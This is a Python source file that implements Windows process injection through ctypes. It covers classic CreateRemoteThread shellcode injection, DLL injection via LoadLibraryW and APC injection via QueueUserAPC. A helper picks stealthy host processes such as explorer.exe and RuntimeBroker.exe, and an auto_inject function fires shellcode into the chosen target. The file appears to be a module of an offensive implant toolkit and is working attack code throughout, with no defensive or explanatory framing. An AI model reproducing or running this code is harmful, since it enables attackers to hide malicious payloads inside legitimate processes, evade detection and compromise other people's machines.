# injection.py — Process injection techniques via ctypes
#
# Three injection methods:
#   1. Classic CreateRemoteThread (shellcode injection)
#   2. DLL Injection (LoadLibraryW via remote thread)
#   3. APC Injection (QueueUserAPC into alertable thread)
#
# All Windows API calls through ctypes — no pywin32 needed.

import ctypes
import ctypes.wintypes
import os

kernel32 = ctypes.windll.kernel32

# ── Constants ──────────────────────────────────────────────────
PROCESS_ALL_ACCESS     = 0x001FFFFF
MEM_COMMIT             = 0x00001000
MEM_RESERVE            = 0x00002000
PAGE_READWRITE         = 0x04
PAGE_EXECUTE_READ      = 0x20
PAGE_EXECUTE_READWRITE = 0x40
INFINITE               = 0xFFFFFFFF
TH32CS_SNAPTHREAD      = 0x00000004
THREAD_SET_CONTEXT     = 0x0010
THREAD_SUSPEND_RESUME  = 0x0002
THREAD_GET_CONTEXT     = 0x0008
THREAD_QUERY_INFORMATION = 0x0040

# ── Structures ─────────────────────────────────────────────────
class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.wintypes.DWORD),
        ("cntUsage", ctypes.wintypes.DWORD),
        ("th32ThreadID", ctypes.wintypes.DWORD),
        ("th32OwnerProcessID", ctypes.wintypes.DWORD),
        ("tpBasePri", ctypes.c_long),
        ("tpDeltaPri", ctypes.c_long),
        ("dwFlags", ctypes.wintypes.DWORD),
    ]


# ═══════════════════════════════════════════════════════════════
# Classic CreateRemoteThread Injection
# ═══════════════════════════════════════════════════════════════

def inject_shellcode(pid: int, shellcode: bytes) -> dict:
    """Inject shellcode into a remote process via CreateRemoteThread.

    Flow:
        1. OpenProcess → get handle
        2. VirtualAllocEx → allocate RW memory in target
        3. WriteProcessMemory → write shellcode
        4. VirtualProtectEx → change to RX (no write)
        5. CreateRemoteThread → execute shellcode
        6. CloseHandle → clean up

    Args:
        pid: Target process ID.
        shellcode: Raw shellcode bytes to inject.

    Returns:
        Dict with status, pid, and details.
    """
    handle = None
    try:
        # Open target process
        handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not handle:
            return {
                "status": "error", "pid": pid,
                "message": f"OpenProcess failed (error {ctypes.GetLastError()})",
            }

        # Allocate memory in target (RW)
        alloc = kernel32.VirtualAllocEx(
            handle, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        )
        if not alloc:
            return {
                "status": "error", "pid": pid,
                "message": f"VirtualAllocEx failed (error {ctypes.GetLastError()})",
            }

        # Write shellcode
        written = ctypes.c_size_t(0)
        ok = kernel32.WriteProcessMemory(
            handle, alloc, shellcode, len(shellcode), ctypes.byref(written),
        )
        if not ok:
            return {
                "status": "error", "pid": pid,
                "message": f"WriteProcessMemory failed (error {ctypes.GetLastError()})",
            }

        # Change memory protection to RX
        old_protect = ctypes.wintypes.DWORD(0)
        kernel32.VirtualProtectEx(
            handle, alloc, len(shellcode),
            PAGE_EXECUTE_READ, ctypes.byref(old_protect),
        )

        # Create remote thread at shellcode address
        thread_id = ctypes.wintypes.DWORD(0)
        thread_handle = kernel32.CreateRemoteThread(
            handle, None, 0, alloc, None, 0, ctypes.byref(thread_id),
        )
        if not thread_handle:
            return {
                "status": "error", "pid": pid,
                "message": f"CreateRemoteThread failed (error {ctypes.GetLastError()})",
            }

        kernel32.CloseHandle(thread_handle)

        return {
            "status": "ok", "pid": pid,
            "method": "CreateRemoteThread",
            "thread_id": thread_id.value,
            "alloc_addr": hex(alloc),
            "size": len(shellcode),
        }

    except Exception as e:
        return {"status": "error", "pid": pid, "message": str(e)}
    finally:
        if handle:
            kernel32.CloseHandle(handle)


# ═══════════════════════════════════════════════════════════════
# DLL Injection
# ═══════════════════════════════════════════════════════════════

def inject_dll(pid: int, dll_path: str) -> dict:
    """Inject a DLL into a remote process via LoadLibraryW.

    Writes the DLL path into target process memory, then creates
    a remote thread with LoadLibraryW as the entry point.

    Args:
        pid: Target process ID.
        dll_path: Full path to DLL file to inject.

    Returns:
        Dict with status, pid, and details.
    """
    handle = None
    try:
        dll_path = os.path.abspath(dll_path)
        if not os.path.exists(dll_path):
            return {"status": "error", "pid": pid, "message": f"DLL not found: {dll_path}"}

        # Encode path as wide string (UTF-16LE) + null terminator
        dll_path_bytes = (dll_path + "\x00").encode("utf-16-le")

        handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not handle:
            return {
                "status": "error", "pid": pid,
                "message": f"OpenProcess failed (error {ctypes.GetLastError()})",
            }

        # Allocate space for the DLL path string
        alloc = kernel32.VirtualAllocEx(
            handle, None, len(dll_path_bytes),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        )
        if not alloc:
            return {
                "status": "error", "pid": pid,
                "message": f"VirtualAllocEx failed (error {ctypes.GetLastError()})",
            }

        # Write DLL path
        written = ctypes.c_size_t(0)
        ok = kernel32.WriteProcessMemory(
            handle, alloc, dll_path_bytes,
            len(dll_path_bytes), ctypes.byref(written),
        )
        if not ok:
            return {
                "status": "error", "pid": pid,
                "message": f"WriteProcessMemory failed (error {ctypes.GetLastError()})",
            }

        # Get LoadLibraryW address from kernel32
        k32_handle = kernel32.GetModuleHandleW("kernel32.dll")
        load_lib_addr = kernel32.GetProcAddress(k32_handle, b"LoadLibraryW")
        if not load_lib_addr:
            return {
                "status": "error", "pid": pid,
                "message": "Failed to resolve LoadLibraryW",
            }

        # Create remote thread: entry = LoadLibraryW, param = DLL path address
        thread_id = ctypes.wintypes.DWORD(0)
        thread_handle = kernel32.CreateRemoteThread(
            handle, None, 0,
            load_lib_addr,   # Thread start: LoadLibraryW
            alloc,           # Argument: pointer to DLL path
            0, ctypes.byref(thread_id),
        )
        if not thread_handle:
            return {
                "status": "error", "pid": pid,
                "message": f"CreateRemoteThread failed (error {ctypes.GetLastError()})",
            }

        # Wait for LoadLibraryW to complete
        kernel32.WaitForSingleObject(thread_handle, 5000)
        kernel32.CloseHandle(thread_handle)

        return {
            "status": "ok", "pid": pid,
            "method": "DLL_Injection",
            "dll": dll_path,
            "thread_id": thread_id.value,
        }

    except Exception as e:
        return {"status": "error", "pid": pid, "message": str(e)}
    finally:
        if handle:
            kernel32.CloseHandle(handle)


# ═══════════════════════════════════════════════════════════════
# APC Injection
# ═══════════════════════════════════════════════════════════════

def inject_apc(pid: int, shellcode: bytes) -> dict:
    """Inject shellcode via QueueUserAPC into target process threads.

    Queues an APC to all threads in the target process. The shellcode
    executes when a thread enters an alertable wait state.

    Args:
        pid: Target process ID.
        shellcode: Raw shellcode bytes.

    Returns:
        Dict with status, pid, and details.
    """
    handle = None
    try:
        handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not handle:
            return {
                "status": "error", "pid": pid,
                "message": f"OpenProcess failed (error {ctypes.GetLastError()})",
            }

        # Allocate and write shellcode
        alloc = kernel32.VirtualAllocEx(
            handle, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        )
        if not alloc:
            return {
                "status": "error", "pid": pid,
                "message": f"VirtualAllocEx failed",
            }

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            handle, alloc, shellcode, len(shellcode), ctypes.byref(written),
        )

        # Find threads belonging to target process
        thread_ids = _get_thread_ids(pid)
        if not thread_ids:
            return {
                "status": "error", "pid": pid,
                "message": "No threads found in target process",
            }

        # Queue APC to each thread
        queued = 0
        for tid in thread_ids:
            t_handle = kernel32.OpenThread(
                THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                False, tid,
            )
            if t_handle:
                result = kernel32.QueueUserAPC(alloc, t_handle, 0)
                if result:
                    queued += 1
                kernel32.CloseHandle(t_handle)

        if queued == 0:
            return {
                "status": "error", "pid": pid,
                "message": "Failed to queue APC to any thread",
            }

        return {
            "status": "ok", "pid": pid,
            "method": "APC_Injection",
            "threads_queued": queued,
            "total_threads": len(thread_ids),
            "alloc_addr": hex(alloc),
        }

    except Exception as e:
        return {"status": "error", "pid": pid, "message": str(e)}
    finally:
        if handle:
            kernel32.CloseHandle(handle)


def _get_thread_ids(pid: int) -> list:
    """Get all thread IDs for a process via CreateToolhelp32Snapshot."""
    threads = []
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snap == ctypes.c_void_p(-1).value:
        return threads

    entry = THREADENTRY32()
    entry.dwSize = ctypes.sizeof(THREADENTRY32)

    if kernel32.Thread32First(snap, ctypes.byref(entry)):
        while True:
            if entry.th32OwnerProcessID == pid:
                threads.append(entry.th32ThreadID)
            if not kernel32.Thread32Next(snap, ctypes.byref(entry)):
                break

    kernel32.CloseHandle(snap)
    return threads


# ═══════════════════════════════════════════════════════════════
# Target Process Finder
# ═══════════════════════════════════════════════════════════════

def find_target_process(preferred: list = None) -> dict:
    """Find a suitable process for injection.

    Searches for common target processes that are likely to be running
    and won't cause stability issues when injected.

    Args:
        preferred: List of preferred process names.
                   Defaults to common safe targets.

    Returns:
        Dict with pid and name of the selected target.
    """
    if preferred is None:
        preferred = [
            "explorer.exe",
            "RuntimeBroker.exe",
            "sihost.exe",
            "taskhostw.exe",
            "notepad.exe",
        ]

    from modules.process import list_processes

    procs = list_processes()
    current_pid = os.getpid()

    # Try preferred targets first
    for target_name in preferred:
        for proc in procs:
            if (
                proc.get("name", "").lower() == target_name.lower()
                and proc.get("pid", 0) != current_pid
                and proc.get("pid", 0) > 4  # Skip System/Idle
            ):
                return {
                    "status": "ok",
                    "pid": proc["pid"],
                    "name": proc["name"],
                }

    return {"status": "error", "message": "No suitable target process found"}


def auto_inject(shellcode: bytes) -> dict:
    """Find a target process and inject shellcode automatically.

    Args:
        shellcode: Raw shellcode bytes.

    Returns:
        Dict with injection result.
    """
    target = find_target_process()
    if target.get("status") != "ok":
        return target
    return inject_shellcode(target["pid"], shellcode)
